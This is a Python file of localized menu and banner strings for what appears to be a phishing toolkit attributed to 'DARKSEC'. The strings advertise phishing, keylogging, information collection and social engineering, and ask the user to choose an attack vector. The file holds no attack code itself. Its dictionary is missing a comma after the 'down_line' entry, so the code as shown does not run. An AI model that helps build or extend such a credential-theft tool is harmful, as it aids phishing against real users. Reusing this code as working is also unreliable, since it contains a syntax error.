#Contains all ActionManager/main_runner.py strings
import Defs.ThemeManager.theme as theme
from Defs.LocalizationManager.localization import _


default_palette = theme.default_palette

def check_version():                    #WILL BE MOVED FROM HERE
    with open('version.txt') as f:      # THIS WILL BE MOVED TOO
        #ver_current = f.read()         # DONT REMOVE THESE COMMENTS
        #version = ver_current.strip()  # TO-DO
        return f.read().strip()
version = check_version()

lang_start_main_menu = {
    "version_by_darksec": _("                                              {2}[{0}v {3}{2}]{0} BY:DARKSEC{1}").format(default_palette[4], default_palette[2], default_palette[0], version),
    "short_description": _("{1}[{0} Modern Phishing Tool With Advanced Functionality {1}]").format(default_palette[2],default_palette[0]),
    "features_summary" : _("{1}[{0} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {1}]").format(default_palette[2], default_palette[0]),
    "down_line" : "{0}________________________________________________________________________________".format(default_palette[0])
    "attack_vector_message" : _("------------------------\nSELECT ANY ATTACK VECTOR:\n------------------------"),
    "phishing_modules_header" : _("\n{0}PHISHING-MODULES:".format(default_palette[0])),
}

             
#
#